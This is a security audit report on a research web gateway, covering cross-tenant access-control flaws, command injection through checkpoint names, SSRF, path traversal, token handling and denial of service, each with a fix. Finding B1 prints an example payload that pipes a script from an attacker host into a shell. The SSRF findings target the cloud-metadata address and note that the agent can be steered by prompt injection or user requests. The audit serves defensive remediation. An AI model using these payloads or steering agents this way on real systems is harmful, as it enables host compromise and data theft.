# PathScientist / PathLab Web — Security Audit Results

> Date: 2026-06-18
> Type: **SECURITY AUDIT RESULT**
> Target: current working tree of `fix-pathscientist-persist-web-sessions-work` — the **gateway/web layer**
>   (`server/gateway/`), DB repositories, and the uncommitted WIP. This is the web attack surface the first
>   backend-only review excluded.
> Method: 7 security finders (gateway-weighted) → adversarial per-finding verification (refute-by-default) →
>   manual synthesis. 25 verified, **22 confirmed**, 3 refuted. Line numbers are repo-relative under
>   `server/`.

## Severity summary

| Severity | Count | Headline |
|---|---:|---|
| **Critical** | 2 | Cross-tenant **IDOR** — any authenticated user can read/download/stop/delete other users' sessions |
| **High** | 6 | IDOR variants + **host RCE via checkpoint-name shell injection** |
| **Medium** | 3 | SSRF (chat fetch + dataset provider) + run-download path-traversal gap |
| **Low** | 8 | JWT-in-query, DoS/persistence robustness, owner-downgrade, public-dataset-on-empty-owner, sandbox/subprocess injection |
| **Info** | 3 | session-id enumeration; import_session_bundle (CLI-only); **no SQLi (verified clear)** |

## Executive summary

The single most important issue is a **critical broken-access-control / IDOR** in the PathScientist gateway: the
in-memory ownership check **fails open on an empty owner**, and the gateway **never persists `user_id`** to the session
registry or onto disk-scanned conversation stubs. Result: any authenticated low-privilege user can **enumerate, read,
download, stream, stop, resume, and delete other users' research sessions and entire workspaces** (model weights,
datasets, code, stdout/stderr, final reports). Six independent finders converged on this.

Two more serious classes: **host RCE** via the agent `checkpoint` tool (unquoted name → host-side shell git), and
**SSRF** reachable from chat (`[READ_ARTICLE]` → server fetches arbitrary URLs incl. cloud-metadata). Plus a
run-artifact download path that **omits the base-dir containment** its sibling endpoints enforce.

**Fix first (in order):**
1. **Close the IDOR** (§A1): make `_can_access_record` fail closed on empty owner, persist `user_id` in the registry,
   stamp owner on disk-scanned stubs, and add user-scoping at the repository layer. *This is the priority.*
2. **Checkpoint RCE** (§B1): validate the checkpoint name + `shlex.quote` the git interpolation (review plan `A8`).
3. **SSRF** (§C): host-allowlist + block private/link-local/metadata IPs on the chat fetch and dataset providers.
4. **Run-download containment** (§D): add the `is_relative_to(base_dir)` check to `_build_run_artifact_zip`.

---

## A. Access control / IDOR

### A1 · CRITICAL · `gateway/routes/pathscientist.py` — `_can_access_record` (2297-2301), `summary()`/`_registry_payload` (176-216, 1543-1548), `_scan_persisted_conversations` (2859-2874)
**The bug (one root, two reach paths):**
```python
def _can_access_record(record, user):
    if user is None or _user_is_admin(user): return True
    owner = str(getattr(record,'user_id','') or '').strip()
    return not owner or owner == str(user.id)      # ← empty owner ⇒ TRUE (fail OPEN)
# vs the correct DB-side check:
def _can_access_db_session(session, user):
    owner = str(getattr(session,'user_id','') or '')
    return bool(owner) and owner == str(user.id)   # ← empty owner ⇒ FALSE (fail closed)
```
Records reach the endpoints with an **empty `user_id`** via two paths that both bypass the stricter DB check (because
`_SESSION_MANAGER.get()` returns the empty-owner record first, so `_load_db_record` is never consulted):
1. **Registry round-trip:** `SessionRecord.summary()` / `_registry_payload()` **omit `user_id`**, so after a gateway
   restart every registry-reloaded session has `user_id=''`.
2. **Disk scan:** `_scan_persisted_conversations()` builds `SessionRecord` stubs for **every** conversation under the
   shared persistence root and never sets `user_id` (defaults to `''`).
**Impact:** every endpoint gating on `_can_access_record` — `GET /pathscientist/sessions` (+`?include_persisted=true`
lists *all* users' sessions), `GET /sessions/{id}`, `/events` (SSE), `/download`, `/runs/{run_id}/download`,
`POST /stop`, `/resume`, `DELETE /{id}` — is accessible **cross-tenant**: full read of research question/state/events/
final report, **workspace zip download** (model weights, datasets, code, stdout/stderr), and **stop/delete** (disruption
+ destruction incl. on-disk workspace erasure). Session ids are short/predictable (`conv_id.replace('-','')[:12]`,
48-bit) and leaked in every summary, so enumeration is trivial.
**Fix:**
1. `_can_access_record`: `return bool(owner) and owner == str(user.id)` (deny empty/unknown owner; admin/None already
   short-circuit).
2. **Persist `user_id`** in `summary()` / `_registry_payload()` so the registry round-trips ownership.
3. **Stamp `user_id`** onto disk-scanned stubs (from the DB row / persisted summary); restrict un-ownable legacy
   sessions to admins.
4. After `_SESSION_MANAGER.get()`, re-verify against the authoritative DB row before serving (don't trust the in-memory
   record's owner).

### A2 · HIGH · `backend/database/repositories/auto_research.py` (get_session / delete_session / get_session_events / …)
**No user scoping at the repository layer.** `get_session`/`delete_session`/`get_session_events`/`get_events_after`/
`get_latest_sequence` filter **only by `session_id`** — zero defense-in-depth; they trust the caller entirely for
ownership. With A1, there is no second line of defense.
**Fix:** thread `user_id` into the read/delete queries (admins bypass) so the repository denies cross-user access even
if a route check regresses.

### A3 · LOW · `auto_research.py upsert_session` (82-86) + `pathscientist_persistence.py _persist_event` (259-284)
**Owner downgrade / mass-assignment.** `upsert_session` copies every payload key onto the existing row (skipping only
`id`/`created_at`), **including `user_id`**, with no check it matches the current owner; `_persist_event` falls back to
`user_id='unknown'` when `existing` is None. A legitimately-owned session can be silently **downgraded to `unknown`**
and become inaccessible to its owner (data loss).
**Fix:** never overwrite `user_id` on an existing row (or assert it matches); don't fall back to `unknown` for an owned
session.

### A4 · LOW · `backend/pathscientist/dataset/pathlab_registration.py` (199-208) + `runner.py:129`
**Ownerless ⇒ public dataset.** `register_manifest_with_pathlab` sets `is_public = user_id is None` and resolves by name
without an owner filter when `user_id is None` (and `runner.py:129` collapses an empty `pathlab_user_id` to `None`). A
session running with an empty `pathlab_user_id` (admin-initiated, misconfig, future programmatic start) creates the
acquired dataset + WSI rows as **public and ownerless**, visible to all users; a name collision can attach to an
existing public dataset.
**Fix:** refuse registration when `user_id` is falsy (`status='skipped', reason='no_owner'`); decouple public visibility
from owner identity (explicit `make_public` flag).

---

## B. Command injection / RCE

### B1 · HIGH · `backend/pathscientist/runtime/workspace.py` (create/restore/delete_checkpoint 458-519; `_git` 556-558)
**Host RCE via checkpoint name.** `tag = f"checkpoint/{name}"` (agent-controlled) is interpolated **unquoted** into
`_git(f"tag {tag}")` / `f"checkout {tag} -- ."` / `f"rev-parse {tag}"`, and `_git` runs `execute_command(f"git {args}")`
**through a shell** (confirmed: both the SDK `LocalWorkspace` and the `_SubprocessWorkspace` fallback run via a shell —
the code's own docstrings note this is why `commit()` uses `-F`). `checkpoint create x;curl http://attacker/sh|sh`
⇒ **arbitrary command execution on the host running the gateway**, with gateway privileges (other users' workspaces,
uploads dir, `.env`/secrets, DB socket). These git/checkpoint commands run **host-side even when `sandbox_mode=apptainer`**,
so the sandbox does not contain it. Reachable by the semi-trusted agent and **weaponizable via prompt injection** from
retrieved literature/dataset content.
**Fix:** validate `name` against `^[A-Za-z0-9._-]{1,64}$` at the `CheckpointExecutor` boundary **and** `shlex.quote`
every interpolated tag (or pass argv to a non-shell exec). (= review plan `A8`.)

### B2 · LOW · `workspace.py _SubprocessWorkspace.execute_command` (115-139)
The SDK-absent fallback runs `subprocess.run(command, shell=True)`. Gated behind `PATHSCIENTIST_ALLOW_SUBPROCESS_WORKSPACE_FALLBACK`
(constructor raises otherwise), so it shouldn't be active in a correct deployment — but it **guarantees** shell parsing
and amplifies B1. **Fix:** execute argv lists (`shell=False`); fail closed in multi-user deployments.

### B3 · LOW · `backend/pathscientist/runtime/sandbox.py:156`
`bash -lc "cd {workspace_dir} && {runner} {script_path}"` interpolates agent-controlled `script_path` unquoted →
in-container shell injection. Bounded (the agent already runs arbitrary scripts in the container), but defeats the
"only runs `python <script>`" assumption. **Fix:** `shlex.quote` both, validate `script_path` is workspace-relative.

---

## C. SSRF

### C1 · MEDIUM · `gateway/routes/chat_pdf_sources.py` `download_pdf` (417-480) + `_fetch_lightweight_web_markdown` (1015-1016)
**Web-reachable SSRF.** Both validate only `http(s)://` then `httpx.AsyncClient(follow_redirects=True).get(url)` with
**no host allowlist and no block on private/loopback/link-local/metadata IPs** (127.0.0.1, 169.254.169.254, 10.x). The
URL originates from the LLM's `[READ_ARTICLE]` block (`chat.py:2114-2145`), which **an authenticated user can steer** by
asking the assistant to read a URL → server fetches internal/metadata endpoints (blind/limited SSRF).
**Fix:** resolve the host and reject private/loopback/link-local/reserved/metadata ranges (v4+v6); re-validate after
each redirect (or disable redirects and re-check each hop); optionally allowlist publisher/academic domains.

### C2 · MEDIUM · `backend/pathscientist/dataset/providers/direct_http.py:86` (+ other providers)
`sess.get(url, stream=True)` on `record.download.urls` with no allowlist/IP filtering; discovered-dataset URLs come from
LLM extraction over retrieved literature. (Default `download_policy='public_only'` forces discovered records to
`access='manual'` and rejects them, narrowing default exploitability — but the SSRF sink is unguarded and reachable
under permissive/`all` policy, which is the configured default on the dev box.) **Fix:** shared egress guard (https-only,
deny RFC1918/link-local/loopback/metadata, no cross-host redirects) across all URL-fetching providers + literature fetchers.

---

## D. Path traversal

### D1 · MEDIUM · `gateway/routes/pathscientist.py _build_run_artifact_zip` (4277-4334)
**Missing containment check.** `_build_session_artifact_zip` (4246-4249) and `_delete_session_workspace` (1699-1707)
both reject a workspace unless `workspace == base_dir or workspace.is_relative_to(base_dir)`. `_build_run_artifact_zip`
**performs no such check** — it trusts the `workspace` from `_resolve_workspace_from_state`, which returns any
`state['workspace_path'/'workspace_dir'/'workspace_root']` / `grounding.*` / `persisted_summary.*` directory with no
confinement. If a persisted summary ever carries a workspace path outside the base dir (agent-written summaries, restored
rows, mass-assigned state), the run-download reads evidence files from an arbitrary directory. Combined with the IDOR,
this widens. **Fix:** add the `is_relative_to(base_dir)` guard at the top of `_build_run_artifact_zip`, and centralize
the confinement in `_resolve_session_workspace`.

> Note: the **session-zip** and **workspace-delete** paths *are* properly guarded (verified independently) — only the
> run-zip path regressed.

---

## E. Auth hardening

### E1 · LOW · `backend/auth/dependencies.py` (371-401) used at `pathscientist.py` SSE/download (3626-3631, 3657-3661, 3691-3695)
**JWT in query string.** SSE (`get_user_from_token_param`) and downloads (`get_user_from_header_or_param`) accept the
full session JWT via `?token=`. Tokens land in gateway/proxy access logs, browser history, and `Referer`, widening the
theft window; amplified by the IDOR (a leaked token grants the victim's full session set).
**Fix:** prefer header/HttpOnly-cookie auth; if query tokens are unavoidable for EventSource/browser downloads, issue
short-lived single-use tokens scoped to one `session_id`; scrub tokens from logs + set `Referrer-Policy: no-referrer`.

---

## F. DoS / robustness

### F1 · LOW · `StartPathScientistSessionRequest.question` (`pathscientist.py:75`) + `_session_payload` (381) + models `Text` (1315)
`question` is `Field(..., min_length=1)` with **no `max_length`**, written to `research_question` (unbounded `Text`) with
**no truncation**, re-serialized on every poll/SSE refresh. Authenticated storage-amplification/DoS.
**Fix:** `max_length` on the request + `_truncate_text` on `research_question`; add a byte budget + recursion-depth guard
to `_json_safe`.

### F2 · LOW · `gateway/pathscientist_persistence.py _run_best_effort` (1418-1425)
All persistence (events, terminal state, **trained-model registration**) is best-effort on the single gateway loop with
a **process-wide lock + `future.result(timeout=5)`**. Under DB pressure: writes are silently dropped (session shows
"running" forever / model never registered) and one slow write **serializes event persistence fleet-wide**; the future
isn't cancelled on timeout (leaks in-flight coroutines).
**Fix:** a bounded async queue/worker per loop (no global serialization); `future.cancel()` on timeout; surface
terminal-state/model-registration failures (retry/flag), don't silently swallow them.

---

## G. Cleared / proactive

- **G1 · No SQL injection (verified clear).** Both `auto_research.py` and `pathscientist_persistence.py` use ORM
  expression constructs with bound parameters throughout — no `text()`/f-string/`%` queries. `session_id/sequence/user_id/run_id`
  all reach the DB as bound parameters. Keep this pattern.
- **G2 · INFO** — `import_session_bundle` trusts a bundle-supplied `user_id` (cross-user forgery primitive) but is
  **not web-reachable** (only the offline CLI migration script calls it). Keep it off the web surface; if ever exposed,
  force the authenticated caller's id.
- **G3 · INFO** — 12-hex (48-bit) deterministic session ids amplify the IDOR; once A1 is fixed this is minor, but prefer
  full-entropy externally-addressable ids.

## Scope note
The PathScientist **backend** findings from the first review (sandbox local-exec, provider traversal/checksum, split
leakage, integrity gates, etc.) are unchanged and tracked in
`2026-06-17-pathscientist-code-review-remediation-plan.md`. This audit adds the **gateway/web layer** that review
excluded; the IDOR (A1) is the new top-priority item across both.
